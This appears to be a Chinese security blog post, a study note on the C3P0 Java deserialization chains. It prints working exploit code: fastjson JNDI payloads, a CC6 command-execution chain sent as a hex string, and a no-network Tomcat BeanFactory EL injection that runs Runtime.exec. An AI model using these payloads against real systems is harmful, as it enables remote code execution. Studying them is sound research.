@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Java反序列化之C3P0链 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">Java反序列化之C3P0链</h1>
+    <div class="post-meta">
+      <time datetime="2025-07-11">2025-07-11</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18979692">https://www.cnblogs.com/Zephyr07/articles/18979692</a></p>
+</blockquote>
+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>仍然是基础！！！</p>
+<h2 id="C3P0概述："><a href="#C3P0概述：" class="headerlink" title="C3P0概述："></a>C3P0概述：</h2><p>在看到标题之前大部分人可能都不知道C3P0是什么东西，但实际上他就是一个开源的JDBC连接池，主要实现的就是数据源和JNDI绑定，目前比较知名的使用他的有Spring和Hibernate等</p>
+<p>那可能又有人问JDBC是什么？</p>
+<p>JDBC英文全称：Java DataBase Connectivity，是java程序访问数据库的标准接口，毕竟java不可能通过TCP去连接数据库~</p>
+<p>那什么是jdbc连接池，在开发情况中，我们可能会频繁的操作数据库，而这就相当于会频繁的创建或销毁句柄，这样就会增大资源的消耗。而连接池就是我们提前写好一些句柄，使用的时候拿出来用，不用的时候放到连接池中，准备下次使用~</p>
+<h2 id="C3P0-反序列化漏洞"><a href="#C3P0-反序列化漏洞" class="headerlink" title="C3P0 反序列化漏洞"></a>C3P0 反序列化漏洞</h2><p>环境：</p>
+<p>jdk8u65</p>
+<p>pom.xml：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1744354758171-786255f6-07ce-49bf-9bda-07a1f45e8524.png"></p>
+<h3 id="C3P0-常见的利用方式"><a href="#C3P0-常见的利用方式" class="headerlink" title="C3P0 常见的利用方式"></a>C3P0 常见的利用方式</h3><ol>
+<li>URLClassLoader远程类加载</li>
+<li>JNDI注入</li>
+<li>以及利用HEX序列化字节加载器进行反序列化攻击(之前从未听说过)</li>
+</ol>
+<p>URLClassLoader远程类加载：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1744962953833-c447b4e3-e743-4727-9b6a-ccb5b6b42fae.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1751614081628-bd9a1665-c986-4dd2-b675-6b3f16ba2140.png"></p>
+<p>PoolBackedDataSourceBase.readObject想要进到getObject中必须要满足传入的类是<code>IndirectlySerialized</code> 这个类</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1751614148115-93899351-c2c3-412e-969a-62e6b1d65456.png"></p>
+<p>进行完这个判断之后调用getObject方法的类从原本的PoolBackedDataSourceBase变成了ConnectionPoolDataSource</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1751614165984-654d3d58-8833-461f-bd44-4e17290c2e13.png"></p>
+<p>但是跟进去发现这是一个接口，没有继承Serializable</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1751614345731-18cdde9c-2621-4b16-8525-e840dd7f5f61.png"></p>
+<p>那这里就没办法了，所以我们去看一下PoolBackedDataSourceBase的writeObject(也就是序列化)，发现他在检测到无法反序列化的时候，会用indirector封装一层</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1751614506206-13dc6ee6-bb97-402f-b10b-318b1432b644.png"></p>
+<p>这里我们如果直接跟indirectForm，会发现什么都没有，仔细看一下代码我们可以发现代码中的indirector是ReferenceIndirector</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1751614549045-092e6163-08af-45a1-9ac1-be3e80e16841.png"></p>
+<p>所以我们先跟到ReferenceIndirector中搜索indirectForm看一下，发现会返回一个<code>ReferenceSerialized</code>像是继承了反序列化的</p>
+<p>但是跟进去看一下会发现他是一个构造函数，但他继承了IndirectlySerialized，发现他继承了serializable</p>
+<p>至此，流程就走完了，看似我们的外表是ConnectionPoolDataSource，但实际上已经是ReferenceSerialized(就是indirectForm return的那个类)</p>
+<p>所以其实整个流程还是较为简单的，下面放一下完整的exp</p>
+<h3 id="C3P0-之-JNDI-注入"><a href="#C3P0-之-JNDI-注入" class="headerlink" title="C3P0 之 JNDI 注入"></a>C3P0 之 JNDI 注入</h3><p>在上面的分析中不知道有没有人注意到一个lookup的方法，看到这个方法第一时间想到的肯定是jndi注入，而这个方法就是在ReferenceIndirector.getObject()里面</p>
+<p>但是我们发现虽然有这个函数，但是contextName似乎无法控制，跟进去发现他是一个内部类的属性值，这就很难修改了，所以这其实是一条假的jndi注入哈哈，就是给看看坑</p>
+<p>真正的jndi注入链是基于fastjson的，可以算是fastjson中的链吧</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027375850-b9e4d591-6b93-4e71-b4c3-5f5997014686.png"></p>
+<p>这里我们可以从漏洞发现者的思维去寻找，先全局搜一下jndi，点开第一个类JndiRefForwardingDataSource中的dereference方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027409784-3d503c13-59cc-4d4b-896b-37299a89e284.png"></p>
+<p>然后全局搜一下lookup，在112行和114行发现了一个lookup且参数名是jndiname，那肯定要去看一看这个jndiname能不能想办法控制</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027453615-205f5261-3955-4be6-abed-08a7aadfc553.png"></p>
+<p>跟进去看一下发现<code>jndiName</code> 是由 <code>this.getJndiName()</code> 获得的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027473046-8ad9e8a6-50fc-4f5b-a88e-bb83a8b29f4e.png"></p>
+<p>所以再看一下getJndiName方法，发现这个方法他判断若jndiname是name类型，就返回((Name) jndiName).clone()，若不是就返回String</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027511306-02aa7a3a-f416-4f35-9e89-19679d4d8b76.png"></p>
+<p>回去看一下dereference，发现他刚好允许我们传入String参数</p>
+<p>那这时候链子的尾部就已经构造好了，只要向上找能利用的就行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027571075-3afae245-28f6-41a7-9fa5-16e004a7bb4d.png"></p>
+<p>同类中的inner函数调用了该方法，所以再找inner的向上调用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027616458-36b78b42-1aa3-4f13-a41e-3969a6bd04e7.png"></p>
+<p>这里发现很多setter&#x2F;gettter方法，看到这里其实就已经满足fastjson的利用条件了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027710715-ddc848b3-0cad-422f-b430-7a141fbdd1cc.png"></p>
+<p>找一个最简单的只需要传入一整数就可以的JndiRefForwardingDataSource中的setLoginTimeout方法</p>
+<p>最终exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line">// JndiRefForwardingDataSource 类的直接 EXP 调用  </span><br><span class="line">public class JndiForwardingDataSourceEXP &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&quot; +  </span><br><span class="line">                &quot;\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:1230/remoteObject\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实这里还能继续向上找，因为这个JndiRefForwardingDataSource是一个default类，相对于public类的利用面会小一点，就是在<code>JndiRefConnectionPoolDataSource</code> 当中，大家可以去尝试一下，和上一个相差无几</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class JndiRefConnectionPoolDataSourceEXP &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot; +  </span><br><span class="line">                &quot;\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:1230/remoteObject\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="C3P0-之-hexbase-攻击利用"><a href="#C3P0-之-hexbase-攻击利用" class="headerlink" title="C3P0 之 hexbase 攻击利用"></a>C3P0 之 hexbase 攻击利用</h3><p>这种攻击方法成立的e原因就是有一个<code>WrapperConnectionPoolDataSource</code> 类，他能反序列化一串十六进制字符串</p>
+<p>链子的头部在WrapperConnectionPoolDataSource类中的构造函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752026950678-53a427f4-7e35-4a49-9c11-ecc611936bb6.png"></p>
+<p>看构造函数发现在给userOverrides赋值的时候会调用C3P0ImplUtils.parseUserOverridesAsString()方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027002596-f1968b81-b6fb-4f26-b1e3-2458eeb93424.png"></p>
+<p>跟进去看看发现，他将hex字符串读进来之后，首先把把字符串头部的HASM_HEADER截掉了，以及会截掉字符串最后一位</p>
+<p>继续看，发现把转码后的结果保存到serbytes这个字节流当中，然后又对字节流执行SerializableUtils.fromByteArray()方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027033836-0679dc1b-cd5c-48d3-848c-7027e2d87384.png"></p>
+<p>跟到fromByteArray函数中看一下，发现他调用了SerializableUtils#deserializeFromByteArray</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1752027060631-5914defc-35e2-48cc-9ebd-57e5548aed4e.png"></p>
+<p>跟进去发现反序列化操作—-readobject</p>
+<p>所以这个很简单，直接用以前的cc链作为主要攻击链即可</p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">package hexBase;  </span><br><span class="line">  </span><br><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">import java.beans.PropertyVetoException;  </span><br><span class="line">import java.io.ByteArrayOutputStream;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">import java.io.ObjectOutputStream;  </span><br><span class="line">import java.io.StringWriter;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class HexBaseFastjsonEXP &#123;  </span><br><span class="line">  </span><br><span class="line">    //CC6的利用链  </span><br><span class="line"> public static Map CC6() throws NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        //使用InvokeTransformer包装一下  </span><br><span class="line"> Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();  </span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(&quot;five&quot;)); // 防止在反序列化前弹计算器  </span><br><span class="line"> TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key&quot;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();  </span><br><span class="line">        expMap.put(tiedMapEntry, &quot;value&quot;);  </span><br><span class="line">        lazyMap.remove(&quot;key&quot;);  </span><br><span class="line">  </span><br><span class="line">        // 在 put 之后通过反射修改值  </span><br><span class="line"> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        Field factoryField = lazyMapClass.getDeclaredField(&quot;factory&quot;);  </span><br><span class="line">        factoryField.setAccessible(true);  </span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        return expMap;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    static void addHexAscii(byte b, StringWriter sw)  </span><br><span class="line">    &#123;  </span><br><span class="line">        int ub = b &amp; 0xff;  </span><br><span class="line">        int h1 = ub / 16;  </span><br><span class="line">        int h2 = ub % 16;  </span><br><span class="line">        sw.write(toHexDigit(h1));  </span><br><span class="line">        sw.write(toHexDigit(h2));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    private static char toHexDigit(int h)  </span><br><span class="line">    &#123;  </span><br><span class="line">        char out;  </span><br><span class="line">        if (h &lt;= 9) out = (char) (h + 0x30);  </span><br><span class="line">        else out = (char) (h + 0x37);  </span><br><span class="line">        //System.err.println(h + &quot;: &quot; + out);  </span><br><span class="line"> return out;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    //将类序列化为字节数组  </span><br><span class="line"> public static byte[] tobyteArray(Object o) throws IOException &#123;  </span><br><span class="line">        ByteArrayOutputStream bao = new ByteArrayOutputStream();  </span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(bao);  </span><br><span class="line">        oos.writeObject(o);  </span><br><span class="line">        return bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    //字节数组转十六进制  </span><br><span class="line"> public static String toHexAscii(byte[] bytes)  </span><br><span class="line">    &#123;  </span><br><span class="line">        int len = bytes.length;  </span><br><span class="line">        StringWriter sw = new StringWriter(len * 2);  </span><br><span class="line">        for (int i = 0; i &lt; len; ++i)  </span><br><span class="line">            addHexAscii(bytes[i], sw);  </span><br><span class="line">        return sw.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;  </span><br><span class="line">        String hex = toHexAscii(tobyteArray(CC6()));  </span><br><span class="line">        System.out.println(hex);  </span><br><span class="line">  </span><br><span class="line">        //Fastjson&lt;1.2.47  </span><br><span class="line"> String payload = &quot;&#123;&quot; +  </span><br><span class="line">                &quot;\&quot;1\&quot;:&#123;&quot; +  </span><br><span class="line">                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +  </span><br><span class="line">                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +  </span><br><span class="line">                &quot;&#125;,&quot; +  </span><br><span class="line">                &quot;\&quot;2\&quot;:&#123;&quot; +  </span><br><span class="line">                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +  </span><br><span class="line">                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +  </span><br><span class="line">                &quot;&#125;&quot; +  </span><br><span class="line">                &quot;&#125;&quot;;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="C3P0链子不出网利用"><a href="#C3P0链子不出网利用" class="headerlink" title="C3P0链子不出网利用"></a>C3P0链子不出网利用</h3><p>上面的urlclassloader加载远程类和jndi注入都需要目标机器出网，虽然说hexbase攻击方法可以不出网，但是前面分析的parseUserOverridesAsString所传入的参数是一个get方法，所以使用fastjson会方便很多，也就导致了对fastjson的版本有要求</p>
+<p>在之前学习jndi注入的时候我们讨论过高版本利用就是可以加载本地的factory类进行工作，但是有要求就是该工厂类至少存在一个getObjectInstance()方法，比如说可以加载tomcat8中的org.apache.naming.factory.BeanFactory来进行EL表达式注入</p>
+<p>导入依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;8.5.0&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;8.5.15&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是要选一条可以不出网利用的且限制较少的链子，其实之前的urlclassloader的链子就可以利用，只需要给之前的exp修改一下就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">package NoNetUsing;  </span><br><span class="line">  </span><br><span class="line">import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  </span><br><span class="line">import org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line">import javax.naming.NamingException;  </span><br><span class="line">import javax.naming.Reference;  </span><br><span class="line">import javax.naming.Referenceable;  </span><br><span class="line">import javax.naming.StringRefAddr;  </span><br><span class="line">import javax.sql.ConnectionPoolDataSource;  </span><br><span class="line">import javax.sql.PooledConnection;  </span><br><span class="line">import java.io.*;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.sql.SQLException;  </span><br><span class="line">import java.sql.SQLFeatureNotSupportedException;  </span><br><span class="line">import java.util.logging.Logger;  </span><br><span class="line">  </span><br><span class="line">public class NoAccessEXP &#123;  </span><br><span class="line">  </span><br><span class="line">    public static class Loader_Ref implements ConnectionPoolDataSource, Referenceable &#123;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line"> public Reference getReference() throws NamingException &#123;  </span><br><span class="line">            ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);  </span><br><span class="line">            resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster=eval&quot;));  </span><br><span class="line">            resourceRef.add(new StringRefAddr(&quot;faster&quot;, &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;));  </span><br><span class="line">            return resourceRef;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line"> public PooledConnection getPooledConnection() throws SQLException &#123;  </span><br><span class="line">            return null;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line"> public PooledConnection getPooledConnection(String user, String password) throws SQLException &#123;  </span><br><span class="line">            return null;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line"> public PrintWriter getLogWriter() throws SQLException &#123;  </span><br><span class="line">            return null;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line"> public void setLogWriter(PrintWriter out) throws SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line"> public void setLoginTimeout(int seconds) throws SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line"> public int getLoginTimeout() throws SQLException &#123;  </span><br><span class="line">            return 0;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line"> public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;  </span><br><span class="line">            return null;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    //序列化  </span><br><span class="line"> public static void serialize(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException &#123;  </span><br><span class="line">        //反射修改connectionPoolDataSource属性值  </span><br><span class="line"> PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);  </span><br><span class="line">        Class cls = poolBackedDataSourceBase.getClass();  </span><br><span class="line">        Field field = cls.getDeclaredField(&quot;connectionPoolDataSource&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(poolBackedDataSourceBase,c);  </span><br><span class="line">  </span><br><span class="line">        //序列化流写入文件  </span><br><span class="line"> FileOutputStream fos = new FileOutputStream(new File(&quot;ser.bin&quot;));  </span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(fos);  </span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    //反序列化  </span><br><span class="line"> public static void unserialize() throws IOException, ClassNotFoundException &#123;  </span><br><span class="line">        FileInputStream fis = new FileInputStream(new File(&quot;ser.bin&quot;));  </span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(fis);  </span><br><span class="line">        objectInputStream.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;  </span><br><span class="line">        Loader_Ref loader_ref = new Loader_Ref();  </span><br><span class="line">        serialize(loader_ref);  </span><br><span class="line">        unserialize();  </span><br><span class="line">    &#125;  </span><br><span 